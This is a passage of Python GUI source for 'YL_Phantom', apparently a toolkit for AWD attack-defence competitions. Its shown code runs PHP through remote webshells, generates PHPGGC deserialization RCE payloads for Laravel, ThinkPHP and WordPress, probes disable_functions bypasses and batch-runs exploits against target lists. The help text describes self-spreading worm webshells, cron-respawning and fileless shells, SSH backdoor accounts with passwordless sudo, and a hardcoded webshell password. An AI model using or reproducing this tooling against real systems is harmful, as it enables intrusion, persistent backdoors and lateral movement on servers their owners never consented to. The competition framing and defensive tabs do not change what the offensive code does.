    def do_ipban_batch(self):
        fpath = self.ban_file.get().strip()
        ip = self.ban_ip_entry.get().strip()
        if not fpath or not os.path.exists(fpath) or not ip: messagebox.showwarning('', '请填写目标IP并选择IP文件'); return
        try:
            with open(fpath) as f: ips = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            ok = self._ban_cmd('-A', ip, ips)
            self.ban_lw.log(f'[{"OK" if ok else "FAIL"}] 批量封禁 {len(ips)} 个IP', 'ok' if ok else 'fail')
        except Exception as e: self.ban_lw.log(f'[FAIL] {e}', 'fail')

    # ── 定时备份 ──
    def build_sched_backup(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='定时自动备份配置', padding=4); f1.pack(fill=tk.X)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='Web目录:').pack(side=tk.LEFT)
        self.sb_webdir = tb.Entry(r1); self.sb_webdir.insert(0, '/var/www/html')
        self.sb_webdir.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r1, text='\U0001f4c2 选择', command=lambda: pick_dir(self.sb_webdir)).pack(side=tk.LEFT)
        r2 = tb.Frame(f1); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='备份目录:').pack(side=tk.LEFT)
        self.sb_bakdir = tb.Entry(r2, width=30)
        default_bak = os.path.join(BASE, '攻击模块', 'backup')
        self.sb_bakdir.insert(0, default_bak)
        self.sb_bakdir.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        r3 = tb.Frame(f1); r3.pack(fill=tk.X, pady=2)
        self.sb_running = False
        self.btn_sb_start = tb.Button(r3, text='\u25b6 开始定时备份', command=self.toggle_sched_backup, width=18)
        self.btn_sb_start.pack(side=tk.LEFT, padx=2)
        tb.Label(r3, text='间隔:').pack(side=tk.LEFT, padx=(8,0))
        self.sb_interval = tb.Entry(r3, width=4); self.sb_interval.insert(0, '10')
        self.sb_interval.pack(side=tk.LEFT, padx=2)
        tb.Label(r3, text='分钟').pack(side=tk.LEFT)
        self.sb_lbl = tb.Label(r3, text='\u23f8 未启动', foreground='#8b949e')
        self.sb_lbl.pack(side=tk.LEFT, padx=12)
        r4 = tb.Frame(f1); r4.pack(fill=tk.X, pady=2)
        tb.Label(r4, text='最近备份:').pack(side=tk.LEFT)
        self.sb_last = tb.Label(r4, text='无', foreground='#8b949e')
        self.sb_last.pack(side=tk.LEFT, padx=4)
        self.sb_lw = self._log_frame(f)

    def toggle_sched_backup(self):
        if self.sb_running:
            self.sb_running = False
            self.btn_sb_start.config(text='\u25b6 开始定时备份')
            self.sb_lbl.config(text='\u23f8 已停止', foreground='#8b949e')
            return
        wd = self.sb_webdir.get().strip()
        if not wd: messagebox.showwarning('', '请填写Web目录'); return
        self.sb_running = True
        self.btn_sb_start.config(text='\u23f9 停止')
        interval = max(1, int(self.sb_interval.get() or 10))
        self.sb_lbl.config(text=f'\u23f3 每{interval}分钟', foreground='#3fb950')
        bd = self.sb_bakdir.get().strip() or os.path.join(BASE, '攻击模块', 'backup')
        def run():
            import tarfile
            os.makedirs(bd, exist_ok=True)
            while self.sb_running:
                try:
                    fname = f'auto_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.tar.gz'
                    fpath = os.path.join(bd, fname)
                    with tarfile.open(fpath, 'w:gz') as tar: tar.add(wd, arcname=os.path.basename(wd))
                    sz = os.path.getsize(fpath)
                    self.root.after(0, lambda: self.sb_lw.log(f'[OK] {fname} ({sz/1024:.0f}KB)', 'ok'))
                    self.root.after(0, lambda: self.sb_last.config(text=fname))
                except Exception as e:
                    self.root.after(0, lambda e=e: self.sb_lw.log(f'[FAIL] 备份失败: {e}', 'fail'))
                for _ in range(interval * 60):
                    if not self.sb_running: break
                    time.sleep(1)
        threading.Thread(target=run, daemon=True).start()

    # ── phpinfo查看器 ──
    def build_phpinfo(self, parent):
        f = tb.Frame(parent); f.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        f1 = tb.LabelFrame(f, text='远程phpinfo查看', padding=4); f1.pack(fill=tk.X)
        r1 = tb.Frame(f1); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='目标IP:').pack(side=tk.LEFT)
        self.pi_ip = tb.Entry(r1, width=16); self.pi_ip.pack(side=tk.LEFT, padx=4)
        tb.Label(r1, text='端口:').pack(side=tk.LEFT)
        self.pi_port = tb.Entry(r1, width=4); self.pi_port.insert(0, '80'); self.pi_port.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='路径:').pack(side=tk.LEFT)
        self.pi_path = tb.Entry(r1, width=20); self.pi_path.insert(0, '/shell.php'); self.pi_path.pack(side=tk.LEFT, padx=2)
        tb.Label(r1, text='密码:').pack(side=tk.LEFT)
        self.pi_pass = tb.Entry(r1, width=10); self.pi_pass.insert(0, 'cmd'); self.pi_pass.pack(side=tk.LEFT, padx=2)
        tb.Button(r1, text='\U0001f50d 获取phpinfo', command=self.do_phpinfo, bootstyle='info').pack(side=tk.LEFT, padx=4)
        r2 = tb.Frame(f1); r2.pack(fill=tk.X, pady=2)
        self.pi_search_var = tk.StringVar()
        tb.Label(r2, text='搜索:').pack(side=tk.LEFT)
        self.pi_search = tb.Entry(r2, textvariable=self.pi_search_var, width=30)
        self.pi_search.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r2, text='\U0001f50d', command=self.pi_search_text, width=3).pack(side=tk.LEFT)
        self.pi_tree = tb.Treeview(f, columns=('key','val'), show='headings', height=12)
        self.pi_tree.heading('key', text='配置项'); self.pi_tree.heading('val', text='值')
        self.pi_tree.column('key', width=250); self.pi_tree.column('val', width=500)
        self.pi_tree.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        pi_vsb = tb.Scrollbar(f, orient='vertical', command=self.pi_tree.yview)
        pi_vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.pi_tree.configure(yscrollcommand=pi_vsb.set)
        self.pi_data = []

    def do_phpinfo(self):
        ip = self.pi_ip.get().strip()
        if not ip: messagebox.showwarning('', '请输入目标IP'); return
        port = int(self.pi_port.get() or 80)
        path = self.pi_path.get().strip() or '/shell.php'
        pw = self.pi_pass.get().strip() or 'cmd'
        self.pi_data = []
        for i in self.pi_tree.get_children(): self.pi_tree.delete(i)
        def run():
            try:
                base = f'http://{ip}:{port}'
                r = _session().post(f'{base}{path}', data={pw: 'phpinfo();exit;'}, timeout=10)
                if not r.text: r = _session().post(f'{base}{path}', data={pw: 'echo phpversion();'}, timeout=10)
                html = r.text
                # Parse phpinfo table
                rows = re.findall(r'<tr><td class="e">(.*?)</td><td class="v">(.*?)</td>', html, re.DOTALL)
                if not rows:
                    rows = re.findall(r'<tr[^>]*><td[^>]*class="e"[^>]*>(.*?)</td><td[^>]*class="v"[^>]*>(.*?)</td>', html, re.DOTALL)
                for k, v in rows:
                    k = re.sub(r'<[^>]+>', '', k).strip()
                    v = re.sub(r'<[^>]+>', '', v).strip()
                    if k and v: self.pi_data.append((k, v[:200]))
                if not self.pi_data:
                    # Fallback: parse ini values via command
                    r2 = _session().post(f'{base}{path}', data={pw: 'foreach(ini_get_all() as $k=>$v)echo \"$k => {$v[\"local_value\"]}\\n\";'}, timeout=10)
                    for line in r2.text.strip().split('\n'):
                        if ' => ' in line:
                            parts = line.split(' => ', 1)
                            self.pi_data.append((parts[0].strip(), parts[1].strip()[:200]))
                self.root.after(0, self.pi_refresh)
            except Exception as e: self.root.after(0, lambda e=e: messagebox.showerror('错误', str(e)))
        async_run(run)

    def pi_refresh(self):
        for i in self.pi_tree.get_children(): self.pi_tree.delete(i)
        for k, v in self.pi_data:
            self.pi_tree.insert('', tk.END, values=(k, v))

    def pi_search_text(self):
        kw = self.pi_search_var.get().strip().lower()
        for i in self.pi_tree.get_children(): self.pi_tree.delete(i)
        for k, v in self.pi_data:
            if kw in k.lower() or kw in v.lower():
                self.pi_tree.insert('', tk.END, values=(k, v))


# ============================================================
#  主窗口
# ============================================================
class ToolsTab:
    def __init__(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.build_ui()

    def build_ui(self):
        nbf = tb.Notebook(self.parent)
        nbf.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        f1 = tb.Frame(nbf); nbf.add(f1, text='  \U0001f9f0 PHP反序列化  ')
        self.build_phpggc(f1)
        f2 = tb.Frame(nbf); nbf.add(f2, text='  \U0001f50d DFUNC绕过  ')
        self.build_dfuncan(f2)
        f3 = tb.Frame(nbf); nbf.add(f3, text='  \U0001f4e5 批量EXP  ')
        self.build_batch_runner(f3)

    def _log_widget(self, parent):
        from tkinter import scrolledtext
        st = scrolledtext.ScrolledText(parent, font=('Consolas', 9), bg='#1e1e1e', fg='#d4d4d4',
            insertbackground='white', height=8, state=tk.DISABLED)
        st.pack(fill=tk.BOTH, expand=True, pady=2)
        def log_msg(msg, tag='info'):
            st.config(state=tk.NORMAL)
            st.insert(tk.END, msg + '\n')
            st.see(tk.END)
            st.config(state=tk.DISABLED)
        st.log = log_msg
        return st

    # ── PHPGGC 反序列化 ──
    def build_phpggc(self, parent):
        pf = tb.Frame(parent); pf.pack(fill=tk.BOTH, expand=True)
        ctrl = tb.LabelFrame(pf, text='参数配置', padding=4); ctrl.pack(fill=tk.X)
        r1 = tb.Frame(ctrl); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='框架/链:').pack(side=tk.LEFT)
        self.ggc_chain = tb.Combobox(r1, width=35, values=['(加载中…)']); self.ggc_chain.pack(side=tk.LEFT, padx=4)
        tb.Button(r1, text='刷新列表', command=self.ggc_refresh, width=8).pack(side=tk.LEFT, padx=2)
        tb.Button(r1, text='搜索', command=self.ggc_search, width=5).pack(side=tk.LEFT, padx=2)

        r2 = tb.Frame(ctrl); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='参数:').pack(side=tk.LEFT)
        self.ggc_params = tb.Entry(r2); self.ggc_params.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Label(r2, text='编码:').pack(side=tk.LEFT)
        self.ggc_enc = tb.Combobox(r2, width=6, values=['raw', 'base64', 'url', 'json']); self.ggc_enc.set('raw'); self.ggc_enc.pack(side=tk.LEFT, padx=2)
        tb.Button(r2, text='生成Payload', command=self.ggc_generate, bootstyle='success', width=12).pack(side=tk.LEFT, padx=4)

        r3 = tb.Frame(ctrl); r3.pack(fill=tk.X, pady=2)
        tb.Label(r3, text='常用:').pack(side=tk.LEFT)
        for lbl, chain, par in [('Laravel','Laravel/RCE1','system id'),('ThinkPHP','ThinkPHP/RCE3','system id'),('Yii2','Yii2/RCE1','exec id'),('WordPress','WordPress/RCE1','system id')]:
            tb.Button(r3, text=lbl, command=lambda c=chain, p=par: self.ggc_fill(c, p), width=8).pack(side=tk.LEFT, padx=1)

        out = tb.LabelFrame(pf, text='Payload输出', padding=4); out.pack(fill=tk.BOTH, expand=True, pady=4)
        self.ggc_out = tk.Text(out, font=('Consolas', 9), bg='#1e1e1e', fg='#4ec9b0', height=5, wrap=tk.WORD)
        self.ggc_out.pack(fill=tk.BOTH, expand=True)
        bf = tb.Frame(out); bf.pack(fill=tk.X)
        tb.Button(bf, text='复制', command=lambda: self.root.clipboard_append(self.ggc_out.get(1.0, tk.END).strip())).pack(side=tk.LEFT, padx=2)
        tb.Button(bf, text='清空', command=lambda: self.ggc_out.delete(1.0, tk.END)).pack(side=tk.LEFT, padx=2)

        self.ggc_log = self._log_widget(pf)
        self.ggc_refresh()

    def ggc_refresh(self):
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from phpggc_wrapper import list_chains, search_chains
            self.ggc_chains_list = list_chains(refresh=True)
            names = [c['name'] for c in self.ggc_chains_list]
            self.ggc_chain['values'] = names
            if names: self.ggc_chain.set(names[0])
            self.ggc_log.log(f'[+] 已加载 {len(names)} 条链')
        except Exception as e:
            self.ggc_log.log(f'[-] 加载失败: {e}')

    def ggc_search(self):
        kw = self.ggc_chain.get()
        if not kw: return
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from phpggc_wrapper import search_chains
            res = search_chains(kw)
            self.ggc_chain['values'] = [c['name'] for c in res]
            if res: self.ggc_chain.set(res[0]['name'])
            self.ggc_log.log(f'[+] 搜索 "{kw}": 找到 {len(res)} 条')
        except Exception as e:
            self.ggc_log.log(f'[-] {e}')

    def ggc_fill(self, chain, params):
        self.ggc_chain.set(chain); self.ggc_params.delete(0, tk.END); self.ggc_params.insert(0, params)

    def ggc_generate(self):
        chain = self.ggc_chain.get(); raw = self.ggc_params.get()
        if not chain or not raw: return
        parts = raw.strip().split()
        cmd = parts[0]; args = parts[1:] if len(parts) > 1 else []
        enc = self.ggc_enc.get()
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from phpggc_wrapper import generate_payload
            payload, err = generate_payload(chain, cmd, *args, encoding=None if enc == 'raw' else enc)
            if payload:
                self.ggc_out.delete(1.0, tk.END); self.ggc_out.insert(1.0, payload)
                self.ggc_log.log(f'[+] Payload 生成成功 ({len(payload)} 字节)')
            else:
                self.ggc_log.log(f'[-] 生成失败: {err}')
        except Exception as e:
            self.ggc_log.log(f'[-] {e}')

    # ── DFUNC 绕过 ──
    def build_dfuncan(self, parent):
        pf = tb.Frame(parent); pf.pack(fill=tk.BOTH, expand=True)
        ctrl = tb.LabelFrame(pf, text='检测配置', padding=4); ctrl.pack(fill=tk.X)
        r1 = tb.Frame(ctrl); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='Webshell URL:').pack(side=tk.LEFT)
        self.df_url = tb.Entry(r1); self.df_url.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Label(r1, text='密码:').pack(side=tk.LEFT)
        self.df_pass = tb.Entry(r1, width=8); self.df_pass.insert(0, 'cmd'); self.df_pass.pack(side=tk.LEFT, padx=2)
        tb.Button(r1, text='检测绕过', command=self.df_check, bootstyle='success', width=10).pack(side=tk.LEFT, padx=4)

        r2 = tb.Frame(ctrl); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='或 phpinfo URL:').pack(side=tk.LEFT)
        self.df_phpinfo = tb.Entry(r2); self.df_phpinfo.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Button(r2, text='解析phpinfo', command=self.df_parse_pi, width=10).pack(side=tk.LEFT, padx=4)

        out = tb.LabelFrame(pf, text='检测结果', padding=4); out.pack(fill=tk.BOTH, expand=True, pady=4)
        self.df_tree = tb.Treeview(out, columns=('method','desc','payload'), show='headings', height=6,
            bootstyle='dark')
        self.df_tree.heading('method', text='绕过方法'); self.df_tree.heading('desc', text='说明'); self.df_tree.heading('payload', text='示例Payload')
        self.df_tree.column('method', width=100); self.df_tree.column('desc', width=200); self.df_tree.column('payload', width=400)
        self.df_tree.pack(fill=tk.BOTH, expand=True)

        self.df_log = self._log_widget(pf)

    def df_check(self):
        url = self.df_url.get().strip(); pw = self.df_pass.get().strip()
        if not url: return
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from dfunc_bypass import check_remote
            self.df_log.log(f'[+] 检测 {url}...')
            info, suggestions = check_remote(url, pw)
            if not info:
                self.df_log.log('[-] 连接失败或返回异常'); return
            for i in self.df_tree.get_children(): self.df_tree.delete(i)
            for s in suggestions:
                self.df_tree.insert('', tk.END, values=(s['method'], s['desc'], s['payload'][:80]))
            self.df_log.log(f'[+] 找到 {len(suggestions)} 种可用绕过方法')
        except Exception as e:
            self.df_log.log(f'[-] {e}')

    def df_parse_pi(self):
        url = self.df_phpinfo.get().strip()
        if not url: return
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from dfunc_bypass import check_by_phpinfo, suggest_bypass
            info = check_by_phpinfo(url)
            if not info: self.df_log.log('[-] 无法解析phpinfo'); return
            self.df_log.log(f'[+] PHP版本: {info.get("php_version","?")} | 禁用函数: {len(info.get("disabled_functions",[]))} 个')
            for i in self.df_tree.get_children(): self.df_tree.delete(i)
            for s in suggest_bypass(info):
                self.df_tree.insert('', tk.END, values=(s['method'], s['desc'], s['payload'][:80]))
        except Exception as e:
            self.df_log.log(f'[-] {e}')

    # ── 批量EXP ──
    def build_batch_runner(self, parent):
        pf = tb.Frame(parent); pf.pack(fill=tk.BOTH, expand=True)
        ctrl = tb.LabelFrame(pf, text='EXP配置', padding=4); ctrl.pack(fill=tk.X)
        r1 = tb.Frame(ctrl); r1.pack(fill=tk.X, pady=2)
        tb.Label(r1, text='目标(IP:Port,一行一个):').pack(side=tk.LEFT)
        self.br_targets = tk.Text(r1, font=('Consolas', 9), bg='#1e1e1e', fg='#d4d4d4', height=4, width=20)
        self.br_targets.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=4)
        fr = tb.Frame(r1); fr.pack(side=tk.LEFT, fill=tk.Y)
        tb.Button(fr, text='从文件加载', command=self.br_load, width=8).pack(pady=2)
        tb.Label(fr, text='并发:').pack()
        self.br_workers = tb.Spinbox(fr, from_=1, to=50, width=3); self.br_workers.set(10); self.br_workers.pack()

        r2 = tb.Frame(ctrl); r2.pack(fill=tk.X, pady=2)
        tb.Label(r2, text='EXP命令 ({ip}/{port}占位):').pack(side=tk.LEFT)
        self.br_cmd = tb.Entry(r2); self.br_cmd.insert(0, 'python exploit.py {ip} {port}'); self.br_cmd.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)

        r3 = tb.Frame(ctrl); r3.pack(fill=tk.X, pady=2)
        tb.Label(r3, text='Flag正则:').pack(side=tk.LEFT)
        self.br_re = tb.Entry(r3); self.br_re.insert(0, 'flag\\{[^}]+\\}'); self.br_re.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4)
        tb.Label(r3, text='提交URL:').pack(side=tk.LEFT)
        self.br_sub = tb.Entry(r3, width=30); self.br_sub.pack(side=tk.LEFT, padx=4)
        tb.Label(r3, text='Token:').pack(side=tk.LEFT)
        self.br_tok = tb.Entry(r3, width=16); self.br_tok.pack(side=tk.LEFT, padx=2)
        tb.Button(r3, text='开始', command=self.br_run, bootstyle='success', width=6).pack(side=tk.LEFT, padx=2)

        self.br_log = self._log_widget(pf)

    def br_load(self):
        from tkinter import filedialog
        fp = filedialog.askopenfilename(title='选择目标文件')
        if fp:
            with open(fp) as f: self.br_targets.delete(1.0, tk.END); self.br_targets.insert(1.0, f.read())

    def br_run(self):
        targets_raw = self.br_targets.get(1.0, tk.END).strip()
        if not targets_raw: return
        try:
            _try_add_path(os.path.join(BASE, '攻击模块'))
            from batch_runner import BatchRunner
            br = BatchRunner(
                exploit_cmd=self.br_cmd.get().strip(),
                flag_regex=self.br_re.get().strip(),
                submit_url=self.br_sub.get().strip() or None,
                submit_token=self.br_tok.get().strip() or None,
            )
            for line in targets_raw.splitlines():
                line = line.strip()
                if ':' in line:
                    parts = line.split(':')
                    br.add_target(parts[0], int(parts[1]))
                elif line:
                    br.add_target(line, 80)
            self.br_log.log(f'[+] 加载 {len(br.targets)} 个目标, 并发 {self.br_workers.get()}')
            def task():
                br.run_all(max_workers=int(self.br_workers.get()))
                self.root.after(0, lambda: self.br_log.log(f'[+] {br.summary()}'))
                if br.flags:
                    dedup = set(br.flags)
                    self.root.after(0, lambda: self.br_log.log(f'[+] 获取到 {len(dedup)} 个去重Flag'))
                    for f in list(dedup)[:5]:
                        self.root.after(0, lambda f=f: self.br_log.log(f'    {f}'))
                    if br.submit_url:
                        res = br.submit_flags()
                        self.root.after(0, lambda: self.br_log.log(f'[+] 提交结果: {sum(1 for r in res if r["status"]=="ok")}/{len(res)}'))
            import threading; threading.Thread(target=task, daemon=True).start()
        except Exception as e:
            self.br_log.log(f'[-] {e}')


class AWDToolkit:
    def __init__(self):
        self.root = tb.Window(themename='dracula-dark')
        self.root.title('YL_Phantom v2.0 — AWD工具集成 | by Wwlsyl | 开源版')
        try:
            ipath = os.path.join(BASE, 'YL_Phantom', 'icon.png')
            if not os.path.exists(ipath): ipath = os.path.join(BASE, 'icon.png')
            if os.path.exists(ipath):
                ico = tk.PhotoImage(file=ipath)
                self.root.iconphoto(True, ico)
        except Exception: pass
        self.root.geometry('1100x800')
        self.root.minsize(900, 600)
        self.root.protocol('WM_DELETE_WINDOW', self.on_close)
        style = tb.Style()
        self.root.option_add('*Text.background', '#1e1e1e')
        self.root.option_add('*Text.foreground', '#d4d4d4')
        style.configure('Warn.TButton', foreground='#ffffff', background='#e06c00')

        nb = tb.Notebook(self.root)
        nb.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

        f0 = tk.Frame(nb, bg='#0d1117'); nb.add(f0, text='  \U0001f4ca 总览  ')
        try:
            from dashboard import DashboardTab
            self.dash = DashboardTab(f0, tabs_ref=self)
        except Exception:
            self.dash = None
            tk.Label(f0, text='Dashboard 模块加载失败\n请检查 dashboard.py 是否存在', fg='#f85149',
                bg='#0d1117', font=('微软雅黑', 12)).pack(expand=True)

        f1 = tb.Frame(nb); nb.add(f1, text='  \U0001f6e1 WAF管理  ')
        self.waf = WafTab(f1, None)
        self.waf.root = self.root

        f2 = tb.Frame(nb); nb.add(f2, text='  \U0001f3af Flag获取  ')
        self.flag = FlagTab(f2, None)
        self.flag.root = self.root

        f3 = tk.Frame(nb, bg=MON_CK['bg']); nb.add(f3, text='  \U0001f4a1 靶机监控  ')
        self.mon = MonitorTab(f3, None)
        self.mon.root = self.root

        f4 = tb.Frame(nb); nb.add(f4, text='  \U0001f577 木马上传  ')
        self.creep = CreepTab(f4, None)
        self.creep.root = self.root

        f5 = tb.Frame(nb); nb.add(f5, text='  \U0001f527 综合运维  ')
        self.ops = OpsTab(f5, None)
        self.ops.root = self.root

        f6 = tb.Frame(nb); nb.add(f6, text='  \U0001f4e6 工具集成  ')
        self.tools = ToolsTab(f6, None)
        self.tools.root = self.root

        # 底部状态栏
        help_frame = tb.Frame(self.root)
        help_frame.pack(fill=tk.X, padx=6, pady=(0,4))
        try:
            avatar_img = tk.PhotoImage(file=os.path.join(BASE, '管理工具', 'Wwlsyl.png'))
            avatar_img = avatar_img.subsample(24, 24)
            avatar_lbl = tb.Label(help_frame, image=avatar_img)
            avatar_lbl.image = avatar_img
            avatar_lbl.pack(side=tk.LEFT, padx=(0,4))
        except Exception: pass
        tb.Label(help_frame, text='YL_Phantom v2.0 | by Wwlsyl | 开源版', font=('微软雅黑', 8), foreground='#8b949e').pack(side=tk.LEFT)
        tb.Button(help_frame, text='\u2753 使用帮助', command=self.show_help).pack(side=tk.RIGHT)

        self.root.mainloop()

    def show_help(self):
        win = tb.Toplevel(self.root)
        win.title('YL_Phantom — 使用帮助')
        win.geometry('700x580')
        win.minsize(500, 400)
        win.transient(self.root)
        win.grab_set()

        text = scrolledtext.ScrolledText(win, font=('Consolas', 10), bg='#1e1e1e', fg='#d4d4d4',
            insertbackground='white', wrap=tk.WORD, padx=10, pady=10, state=tk.DISABLED)
        text.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)

        for t, c in [('h1','#c586c0'),('h2','#569CD6'),('text','#d4d4d4'),('code','#4ec9b0'),('warn','#dcdcaa'),('sep','#555555')]:
            text.tag_config(t, foreground=c, spacing1=2, spacing2=1)
        text.tag_config('h1', font=('Consolas', 12, 'bold'), spacing3=6)
        text.tag_config('h2', font=('Consolas', 10, 'bold'), spacing3=4)
        text.tag_config('code', font=('Consolas', 9))
        text.tag_config('sep', font=('Consolas', 7))

        HELP = """\
═══════════════════════════════════════════
 YL_Phantom v2.0 — by Wwlsyl
 AWD 混淆流量 + RSA加密 统一管理平台
═══════════════════════════════════════════

╔══════════════════════════════════════════════╗
║  7 个标签页 + Dashboard 总览，以下逐一说明  ║
╚══════════════════════════════════════════════╝


▸ Tab0: Dashboard 总览
────────────────────────────────────────
启动默认页，展示全局状态卡片与快捷操作。

卡片区:
  · 目标数 / 存活数 / Flag数 / 告警数 / WAF部署 / 木马植入

快捷操作:
  · 存活探测 | 端口扫描 | 部署WAF | 获取Flag | 一键加固 | 备份网站

趋势图: 根据活动记录自动绘制柱状图
活动日志: 记录各Tab触发的操作


▸ Tab1: WAF管理
────────────────────────────────────────
用途: 向靶机批量部署 WAF Strong 防护脚本

前置条件:
  · 靶机已有一个 webshell (如 /shell.php)
  · 填写 webshell 路径、密码、端口

批量操作:
  · 部署WAF — 上传 .waf_strong.php + .waf.dat + .user.ini
  · 检查状态 — 验证 WAF 在线/文件大小/规则配置
  · 更新WAF — 重新推送最新 WAF 文件
  · 卸载WAF — 删除所有 WAF 相关文件
  · 停止 — 中断正在进行的批量操作

子标签:
  · 执行日志 — 实时输出执行结果(支持搜索)
  · 规则编辑 — 加载/编辑/保存 .waf.dat 规则内容
  · 攻击流量 — 远程获取靶机access.log并解析攻击者TOP10
  · 心跳监控 — 定时批量检测靶机Webshell存活状态

IP输入格式: 192.168.1.1 或 192.168.1.0/24 或文件路径


▸ Tab2: Flag获取
────────────────────────────────────────
用途: 周期性批量从靶机读取 flag 并自动提交到平台

配置:
  · 目标IP — 靶机地址，支持 CIDR 或逗号分隔
  · 排除自身 — 排除自己的靶机IP
  · Webshell — shell路径/密码
  · 执行命令 — 默认读取 /flag /flag.txt 等(可自定义)
  · 提交配置 — 支持多行提交URL(每行一个平台)

高级:
  · RSA加密通信 — 全流量RSA加密，防check流量检测
  · 混淆流量 — 真请求前发N个假请求，规避流式WAF
  · 仅扫描不提交 — 勾选则只显示flag不上传

轮询: 按设定间隔自动循环，发现新flag自动提交去重
状态栏: 显示目标数/当前轮次/累计提交数
提交记录: 下方表格显示每次提交结果(平台/Flag/状态/时间)
手动提交: 可手动录入Flag并通过所有平台提交


▸ Tab3: 靶机监控
────────────────────────────────────────
用途: 实时监控靶机文件变动和连接日志

前置条件:
  · 靶机需部署 target_monitor.php
  · 输入监控页面的 URL 和密码

面板:
  · 统计卡片 — 文件数/连接数/日志数/警报数
  · 日志区 — 彩色标记 NEW(新增) MOD(修改) DEL(删除) CONN(连接)
  · 子页2: 攻击者TOP — 攻击IP排行(按连接数排序)
  · 子页3: 告警配置 — 声音告警开关 / 频率阈值设置

导出: 可导出 CSV 或 TXT 格式的监控日志


▸ Tab4: 木马上传
────────────────────────────────────────
用途: 部署蠕虫级 webshell，实现权限维持/扩散/横向移动

前置条件:
  · 靶机已有 webshell 用于上传

操作:
  · 🔥 一键植入 — 部署+扩散+蠕虫扫描三步合一
  · 单步部署 — 上传木马到靶机
  · 扩散 — 触发木马自复制到所有可写目录
  · 检查扩散 — 搜索靶机上所有木马文件
  · 清除 — 删除所有木马相关文件
  · 命令执行 — 通过木马执行任意系统命令

木马类型:
  · 蠕虫 — 标准 .creep.php (X-Creep header认证)
  · 不死 — .unreferable.php + cron守护(/5分钟)
  · MD5 — .respawn.php (文件名=MD5(密码) 防扫描)
  · 内存 — 无文件落地(PHP自删除 + .user.ini auto_prepend)

SSH后门:
  · 植入 — 创建系统用户+sudo免密+SSH配置
  · 检测 — 检查后门账号是否存在

心跳监控: 定时检测靶机木马文件存活状态

认证: 木马默认密码 y|lladmin121.@ss


▸ Tab5: 综合运维
────────────────────────────────────────
8 个子标签页:

① 存活探测
   · Ping模式 — ICMP检测
   · Naabu模式 — 调用naabu快速端口扫描(需aigongju)
   · TCP模式 — 手动指定端口列表(逗号分隔)

② 备份还原
   · 备份web目录为tar.gz到本地
   · 从备份文件还原(防路径穿越)

③ SSH管理
   · 测试连接 / 改密 / 远程命令执行
   · 批量改密+加固(改密+PermitRootLogin+755/644)

④ 进程端口
   · 进程列表 / 端口列表(通过木马)
   · 杀进程(kill -9) / 封端口(iptables DROP)

⑤ 木马查杀
   · 扫描本地web目录，检测13种一句话木马(eval/assert/base64_decode等)
   · 可选自动删除

⑥ 数据库
   · SSH隧道管理远程MySQL
   · 查询库列表 / mysqldump全库备份 / 修改密码

⑦ 加固基线
   · 一键: 目录只读 + PHP危险函数禁用 + 禁止目录列表
          + 删多余用户 + 停止无用服务 + 关闭3389
   · 支持自定义加固命令

⑧ 自动修复(AWDP)
   · 扫描源码识别SQLi/RCE/XSS/LFI/SSRF等漏洞
   · 自动生成WAF补丁并部署到靶机
   · 支持本地目录扫描和远程靶机扫描


▸ Tab6: 工具集成
────────────────────────────────────────
第三方工具快捷调用:

  · BurpSuite — 启动HTTP代理(Java)
  · Yakit — 启动安全工具平台
  · TscanPlus — 综合漏洞扫描器
  · 蚁剑 — Webshell管理
  · Wireshark — 流量抓包分析
  · CyberChef — 编码/加密/解码瑞士军刀

路径配置: 可在输入框中自定义各工具路径
启动方式: 点击按钮直接调用(非阻塞)


⚠ 通用说明
────────────────────────────────────────
  · Webshell默认密码: y|lladmin121.@ss
  · IP格式: 单IP / CIDR (192.168.1.0/24) / 逗号分隔 / 文件路径
  · 并发操作自动使用线程池，可在各tab控制并发数
  · 执行中的操作可通过"停止"按钮随时中断
  · 关闭窗口时自动保存所有配置
  · 配置保存在 管理工具/*.json
  · SSH操作需要本机安装 paramiko (pip install paramiko)


⚠ 免责声明
────────────────────────────────────────
  本工具集成了多位安全师傅的开源脚本与思路，属于二次开发整合，
  旨在为 AWD 比赛提供便捷的一站式平台。
  如涉及任何侵权内容，请及时联系，我们将立即删除。
  感谢各位师傅的开源贡献！
  特别致谢: virink/v0id · Akiyama · 及所有开源安全社区
"""

        text.config(state=tk.NORMAL)
        for line in HELP.strip().split('\n'):
            if line.startswith('═'): text.insert(tk.END, line + '\n', 'sep')
            elif line.startswith('▸') or line.startswith('用途') or line.startswith('配置') or line.startswith('操作') or line.startswith('前置条件') or line.startswith('面板') or line.startswith('认证') or line.startswith('免责'):
                text.insert(tk.END, line + '\n', 'h2')
            elif line.startswith('  ·') or line.startswith('  ⚠') or line.startswith('  ├') or line.startswith('  └'):
